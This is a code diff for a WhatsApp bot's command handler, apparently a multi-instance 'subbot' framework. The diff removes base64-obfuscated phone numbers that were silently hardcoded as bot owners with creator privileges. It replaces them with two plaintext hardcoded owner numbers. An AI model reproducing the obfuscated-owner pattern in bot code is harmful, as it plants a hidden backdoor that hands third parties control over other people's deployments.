@@ -511,13 +511,11 @@ m.text = withoutPrefix.slice(commandName.length).trimStart();
 
 const botJid = conn.user?.id?.replace(/:\d+/, "");
 const senderJid = m.sender?.replace(/:\d+/, "");
-const fixed1 = Buffer.from('NTIxNDc3NDQ0NDQ0NA==', 'base64').toString();
-const fixed2 = Buffer.from('NTQ5MjI2NjYxMzAzOA==', 'base64').toString();
 const fixedOwners = [
-  `${fixed1}@s.whatsapp.net`,
-  `${fixed2}@s.whatsapp.net`,
-  `35060220747880@lid`
+  "51987812968@s.whatsapp.net",
+  "51972409783@s.whatsapp.net"
 ];
+    
 const isCreator = fixedOwners.includes(m.sender) || 
   global.owner.map(([v]) => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender);
 const config = await getSubbotConfig(botId);
